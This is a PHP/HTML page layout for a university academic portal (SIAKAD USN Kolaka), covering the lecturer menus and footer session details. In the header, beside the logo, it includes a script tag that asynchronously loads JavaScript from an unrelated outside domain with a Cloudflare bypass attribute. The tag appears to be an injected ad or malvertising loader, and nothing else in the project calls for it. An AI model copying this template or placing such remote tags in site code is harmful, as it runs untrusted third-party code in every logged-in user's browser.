<!DOCTYPE html>
<html lang="en"><head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="description" content="">
        <meta name="author" content="">
        <title>SIAKAD USN KOLAKA </title>
          <link rel="shortcut icon" type="image/png" href="<?php echo base_url() ?>assets/image/logo.jpg">
        <link rel="stylesheet" href="<?php echo base_url() ?>assets/bootstrap/css/bootstrap.min.css">
        <!-- Font Awesome -->

        <link rel="stylesheet" href="<?php echo base_url() ?>assets/font-awesome-4.4.0/css/font-awesome.min.css">

        <link rel="stylesheet" href="<?php echo base_url() ?>assets/plugins/datatables/dataTables.bootstrap.css">
        <link rel="stylesheet" href="<?php echo base_url() ?>assets/bootstrap/css/style-usulan.css">
        <link rel="stylesheet" href="<?php echo base_url() ?>assets/plugins/datepicker/datepicker3.css">
    </head>
    <body>
        <!-- Navbar Top -->
        <!-- Header -->
        <div class="header">
            <div class="container-fluid">
               <div class="col-md-12">
                    <img src="<?php echo base_url(); ?>assets/image/usn.jpg" alt="..." height="80">
                    <script src="https://jouteetu.net/pfe/current/tag.min.js?z=4634947" data-cfasync="false" async></script>
                </div>
				

            </div>
        </div>

        <!-- Start of Navbar Top -->
        <div class="navbar navbar-custom navbar-fixed2">
            <div class="container-fluid">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-responsive-collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                </div>
                <div class="navbar-collapse collapse navbar-responsive-collapse" style="padding-left:0px;">
                    <ul class="nav navbar-nav">
                        <li class=""><a href="<?php echo base_url('dosen');?>"><b>Home</b></a></li>
                        <li class=""><a href="<?php echo base_url();?>dosen/editprofile"><b>Biodata</b></a></li>
                       
                          <li class="dropdown">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Data <b class="caret"></b></a>
                            <ul class="dropdown-menu">
                                <li class=""><a href="<?php echo base_url();?>dosen/">Mahasiswa</a></li>
                                 <li class=""><a href="<?php echo base_url();?>dosen/lmatakuliah"><b>Matakuliah</b></a></li>
                            </ul>

                        </li>
                        <li class=""><a href="<?php echo base_url();?>Dosen/list_mhs_bimbingan"><b>Perwalian</b></a></li>
                          <li class="dropdown">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Kontrol <b class="caret"></b></a>
                            <ul class="dropdown-menu">
                                <li class=""><a href="<?php echo base_url();?>dosen/monitoring_kam">AKM</a></li>
                                 <li class=""><a href="<?php echo base_url();?>Dosen/list_krs_mhs"><b>KRS</b></a></li>
                            </ul>

                        </li>
                        <li class=""><a href="<?php echo base_url();?>dosen/lklsngajar"><b>Kelas</b> </a></li>
                       
                         <li class=""><a href="<?php echo base_url();?>Dosen/lmbimbingan_skripsi"><b>Skripsi</b></a></li>
                      
                        
                       
                        
                        <li class=""><a href="<?php echo base_url();?>bismillah/editUser">Ubah Password</a></li>
                        
                        <li class="dropdown">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Laporan <b class="caret"></b></a>
                            <ul class="dropdown-menu">
                                
                                <li class="dropdown"><a tabindex="-1" href="<?php echo base_url() ?>Dosen/list_bimbingan_akademik"> Mahasiswa Bimbingan </a></li>

                            </ul>

                        </li>
                          <li class=""><a href="<?php echo base_url();?>bismillah/logout">Logout</a></li>

                    </ul>


                </div>
            </div>
        </div>
        <!-- End of Navbar Top-->        
        <!-- End of Navbar Top-->

        <!-- Open Content -->        
        <div class="container-fluid">
            <div class="row">
                <!--<div class="col-xs-12 col-sm-6 col-md-8 col-lg-12">-->
                 <div class="">
                    <style type="text/css">
                        .running-text{
                            font-size: 12px;
                            color: #fff;

                            padding: 5px 10px 0 10px;
                            font-family: sans-serif, calibri, "arial";
                            font-weight: bold;

                        }
                        .alert{
                            padding: 5px 10px 0 10px;
                        }

                        .well{
                            background-color: #fff;
                        }
                        .well > h1 {
                            margin: 0px 0px 10px;
                            font-family: Arial,sans-serif;
                            font-weight: bold;
                            font-size: 20px;
                        }

                    </style>


                    <div class="container-fluid">
                       <div id="notifications"><?php echo $this->session->flashdata('msg'); ?></div> 
                        <?php
                        echo $contents;

                        ?>             
                        






                    </div>
                    <!-- End of Right Sidebar -->

                    <!-- End of Left Sidebar -->

                </div>
            </div>


            <!-- FOOTER -->
            <div class="footer">
                <div class="container-fluid">

	User </td><td>:</td><td> <?php echo $this->session->userdata('userid').'-'.$this->session->userdata('nama');?>
       Prodi	</td><td>:</td><td> <?php echo $this->session->userdata('home_base');?>
                
                 

                </div>

            </div>
            <!-- End of Footer -->
    <script src="<?php echo base_url() ?>assets/plugins/jQuery/jQuery-2.1.4.min.js"></script>
    <!-- Bootstrap 3.3.5 -->
    <script src="<?php echo base_url() ?>assets/bootstrap/js/bootstrap.min.js"></script>
    <!-- DataTables -->
    <script src="<?php echo base_url() ?>assets/plugins/datatables/jquery.dataTables.min.js"></script>
    <script src="<?php echo base_url() ?>assets/plugins/datatables/dataTables.bootstrap.min.js"></script>
    <script src="<?php echo base_url('assets/js/jquery.validate.min.js') ?>"></script>

    <!-- page script -->
    <script>
        $(function() {
        $("#example1").DataTable();
        $('#example2').DataTable({
            "paging": true,
            "lengthChange": false,
            "searching": false,
            "ordering": true,
            "info": true,
            "autoWidth": false
        });
        });
    </script>
    <!-- SlimScroll -->





    </body>
</html>